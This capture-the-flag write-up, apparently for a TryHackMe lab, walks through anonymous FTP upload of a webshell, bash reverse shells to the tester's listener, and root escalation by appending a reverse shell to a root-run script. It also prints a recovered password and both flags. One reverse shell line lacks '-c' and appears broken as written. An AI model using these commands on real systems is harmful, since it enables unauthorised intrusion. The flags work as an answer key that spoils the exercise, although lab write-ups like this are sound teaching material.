
An initial port scan revealed the following information.

```
nmap -n -Pn -sS -p- 10.112.152.133                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 17:27 CDT
Nmap scan report for 10.112.152.133
Host is up (0.0096s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
```

An more detailled scanned exposed a lot of information about the running services.

```
nmap -n -Pn -sSCV -p 21,22,80 10.112.152.133                             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 17:32 CDT
Nmap scan report for 10.112.152.133
Host is up (0.0090s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.227.246
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
```

Upon inspecting the webpage we are greeted with an interesting message from the "dev team".

![[Pasted image 20260501003524.png]]

Enumerated endpoints using gobuster & found an exposed /files endpoint

```
gobuster dir -u http://10.112.152.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.152.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 316] [--> http://10.112.152.133/files/]
/server-status        (Status: 403) [Size: 279]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

After inspecting the endpoint we see that there is an ftp share, which hints that the ftp share is inside the Web-Root, publicly accessible. My intuition tells me, that if we have write access and anonymous login in the ftp server, we can upload an webshell and potentially get command execution or even RCE.

![[Pasted image 20260501004412.png]]

We also inspected the "notice.txt" file in the files share. It has the following content and gives us information about an potential user on the server named "Maya".

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

We didn't had write access in the web-root specifically, but in the /ftp endpoint! 

![[Pasted image 20260501004638.png]]

We were able to upload our test.txt onto the ftp share, let's and upload an wolfswebshell.php onto the server.

![[Pasted image 20260501004741.png]]

After uploading our webshell, I viewed it in the browser and got command execution.

![[Pasted image 20260501004833.png]]

Started up my listener on port 80.

```
nc -lvnp 80
```

Executed the following command.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'
```

Gained RCE as user "www-data".


Enumerated all users on the Linux Server.

```
www-data@startup:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
lennie:x:1002:1002::/home/lennie:
ftpsecure:x:1003:1003::/home/ftpsecure:
```

Found the secret recipe in the ~ directory in an "recipe.txt" file.

```
www-data@startup:/$ cat recipe.txt 
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

In the ~ directory of the Linux Server there is an "incidents" directory. After reviewing it I found an old .pcapng file. After viewing it, it revealed an network package which didn't get fully encrypted. 

We were able to capture the plaintext password of user "lennie", because the package didn't get fully encrypted.

```
c4ntg3t3n0ughsp1c3
```

Logged into user "lennie".

Navigated into /home/lennie and retrieved user.txt.

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

I found an interesting scripts directory in lennie's home directory. 

The two scripts in there seem to be owned by root.

```
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Apr 30 23:16 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Apr 30 23:22 startup_list.txt
```

The .sh script is rather interesting. It executes an print.sh script. 

```
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

We can see that lennie is the owner of the script and we got lennie's perms!

```
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 86 Apr 30 23:21 /etc/print.sh
```

Let's add an reverse shell command inside the print.sh script. Since I am assuming that the planner.sh is running as an cronjob out of intuition. 

```
echo "/bin/bash 'bash -i >& /dev/tcp/192.168.227.246/1337 0>&1'" >> /etc/print.sh
```

Started up listener on port 1337.

```
nc -lvnp 1337
```

After some time I gained root shell.

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.227.246] from (UNKNOWN) [10.112.152.133] 60572
bash: cannot set terminal process group (2089): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~#
```

Retrieved root.txt in /root directory.

```
THM{f963aaa6a430f210222158ae15c3d76d}
```